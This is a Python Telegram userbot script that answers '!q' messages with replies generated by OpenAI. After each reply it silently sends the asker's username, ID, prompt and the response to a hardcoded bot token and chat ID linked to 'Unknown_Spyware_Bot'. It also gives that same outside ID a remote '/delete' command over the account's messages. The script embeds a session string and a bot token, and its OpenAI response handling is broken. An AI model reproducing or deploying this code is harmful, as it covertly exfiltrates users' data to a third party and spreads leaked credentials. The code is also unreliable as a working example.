from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import openai
import requests
import os
import time
import re
import logging
# create a session using the session string
CHATGPT_TOKEN = os.environ.get("CHATGPT_TOKEN", None)
session_string = '1BVtsOK0Bu14yWl_aGjrmF6V0IV4iCdMBJWp_8HADH3EzEFk1jLtYVW8KHeJgiMpcohjyf2hcyu6IYODtcsjlJgmiPTQz96ROMAOFkhEe_RNBoVGMh4YcXV_3yOl_QC6EVuSDiRlOLFk71dIlc092Udbv7Cen3YSAajcUj95w1TNhK_p3Apgr-8ZaBhmZKatETugmoSJ74alLXXIceRNrMJWVjh2d3loSDSbUmP8McIr2wQcJ1c53nChn4ut2F17pXqeeKzQS4Xqy295SV1VR3CbLfxQ_w8iA8oxWuPEulfqPogSjL1sCeqdSrLMqy-LFL3Np0QAtq-6Z_3FPr-TMsKRwPjOaHvs='
session = StringSession(session_string)
# configure Telethon
api_id = int(os.environ.get("API_ID", 6))
api_hash = os.environ.get("API_HASH", None)
client = TelegramClient(session, api_id, api_hash)
logging.basicConfig(level=logging.INFO)

openai.api_key = CHATGPT_TOKEN

def generate_text(prompt):
    completion = openai.ChatCompletion.create(
      model="gpt-3.5-turbo",
      messages=[
        {"role": "user", "content":  prompt}
      ],

    )

    response = completion.choices[0].text
    return response

@client.on(events.NewMessage(pattern="^[!?!]q"))
async def binc(event):
    sender_id = event.sender_id
    sender_username = event.sender.username if event.sender.username else None
    try:
        # Get the input from the user and split it into separate lines.
        me = (await event.client.get_me()).username
        prompt = event.text.split(" ", maxsplit=1)[1]
    except Exception as e:
        logging.error(f"Error generating text: {str(e)}")
        await event.reply(e)
    try:
        
        generated_text = generate_text(prompt)
        # print the generated text
        logging.info(f"Generated text: {generated_text}")
        message = await event.reply(generated_text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error generating text: {str(e)}")
        await event.reply(f"Error generating text: {str(e)}")
    message = (f"""
<b>Username:</b> @{sender_username}

<b>Telegram ID:</b> <code>{sender_id}</code>

<b>USER SEND:</b> <code>{prompt}</code>

<b>Bot Response:</b> <code>{generated_text}</code>

<b>Generated With </b> <a href="https://t.me/Unknown_Spyware_Bot/">userbot🤖</a>
""")
        
    bot_token = "5929784262:AAEq87joAkVPKScMS20gpGXALJ18cc556AU"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Set the parameters for the request (the message and chat ID)
    try:
        params = {
        "chat_id": 1927696336,
        "text": message,
        "disable_web_page_preview": True,
        "parse_mode": 'HTML'
        
        }

    # Send the request to the Telegram API

        response = requests.post(url, data=params)
    except Exception as e:
        print (e)




# Handle the "/delete [int]" command
@client.on(events.NewMessage(pattern='/delete (\d+)'))
async def handle_delete(event):
    if event.sender_id != 1927696336:
        return
    try:
        # Extract the integer from the message
        count = int(event.pattern_match.group(1))

        # Get your own messages to delete
        messages = await client.get_messages(
        entity=event.chat_id,
        limit=count,
        from_user='me'
        )
        # Delete the messages
        await client.delete_messages(event.chat_id, messages)
        print ("DELETE?")
    except Exception as e:
        print(f"Error - {str(e)}")





# start the client
async def main():
    await client.start()
    await client.run_until_disconnected()

if __name__ == '__main__':

    asyncio.run(main())
